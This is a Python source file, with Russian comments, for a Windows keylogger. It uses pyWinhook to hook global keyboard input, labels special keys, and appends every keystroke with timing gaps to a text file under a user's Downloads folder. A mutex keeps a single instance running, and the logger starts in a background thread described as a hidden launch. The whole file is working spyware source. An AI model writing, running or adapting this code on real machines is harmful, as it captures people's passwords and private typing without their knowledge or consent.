import pyWinhook as pyHook
import pythoncom
import threading
import win32event, win32api, winerror

class Keylogger:
    i = ''
    log_path = ("C:\\Users\\79050\\Downloads\\klog.txt") # Указываем путь куда сохранять txt с логами
    MAX_KEYSTROKES = 100 # Максимальное к-во символов


class myThread(threading.Thread):
    def __init__(self, threadID, name, counter):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.counter = counter

    def run(self):
        main()


def KeyFilters(event):
    if (event.KeyID == 13):
        Keylogger.i += ' [Enter] '
    elif (event.KeyID == 162 or event.KeyID == 163):
        Keylogger.i += ' [CTRL] '
    elif (event.KeyID == 164 or event.KeyID == 165):
        Keylogger.i += ' [ALT] '
    elif (event.KeyID == 8):
        Keylogger.i += ' [BackSpace] '
    elif (event.KeyID == 160 or event.KeyID == 161):
        Keylogger.i += ' [SHIFT] '
    elif (event.KeyID == 46):
        Keylogger.i += ' [Delete] '
    elif (event.KeyID == 32):
        Keylogger.i += ' [Space] '
    elif (event.KeyID == 27):
        Keylogger.i += ' [Escape] '
    elif (event.KeyID == 9):
        Keylogger.i += ' [TAB] '
    elif (event.KeyID == 20):
        Keylogger.i += ' [CapsLock] '
    elif (event.KeyID == 38):
        Keylogger.i += ' [Up] '
    elif (event.KeyID == 40):
        Keylogger.i += ' [Down] '
    elif (event.KeyID == 37):
        Keylogger.i += ' [Left] '
    elif (event.KeyID == 39):
        Keylogger.i += ' [Right] '
    elif (event.KeyID == 91):
        Keylogger.i += ' [Windows] '
    else:
        Keylogger.i += chr(event.Ascii)# Если айди не попадает под наши "категории" даем ему имя "символа"
    return True


# Инициализируем переменные для sending_procedure
def initialize():
    hm.UnhookKeyboard()
    Keylogger.i = None
    Keylogger.i = ''
    hm.HookKeyboard()


# Записываем собранные клавиши в файл
def writeToFile():
    file = open(Keylogger.log_path, "a") # Открываем файл с флагом "а"
    file.write(Keylogger.i) # Записываем в файл наши "логи"
    file.close() # Закрываем файл
    return True


# Запрещаем копии кейлогера
def disallow_Multiple_Instances():
    mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        exit(0)
        x = ''
        data = ''
        count = 0


from datetime import datetime

time1 = None
time2 = None

def diff_time():
    global time1
    global time2
    if time1 is None: time1 = datetime.now()
    if time2 is None: time2 = datetime.now()

    if time1 and time2:
        diff_time = time2 - time1
        Keylogger.i += '!!Diff time: {}!!\n'.format(diff_time.total_seconds())
        time1 = time2
        time2 = None

# Запуск "Слушателя" клавиш
def OnKeyboardEvent(event):
    KeyFilters(event)
    diff_time()
    writeToFile()
    return True


# Запуск кейлогера
def main():
    hm.KeyDown = OnKeyboardEvent
    hm.HookKeyboard()
    pythoncom.PumpMessages()


file = open(Keylogger.log_path, "a")  # Открываем txt с флагом а

#Делаем переменную pm, которая будет обозначать HookManager
hm = pyHook.HookManager()
#Вызываем функцию disallow_Multiple_Instances
disallow_Multiple_Instances()
#Вызываем функцию для скрытого запуска
thread = myThread(1, "Thread", 1)
thread.start()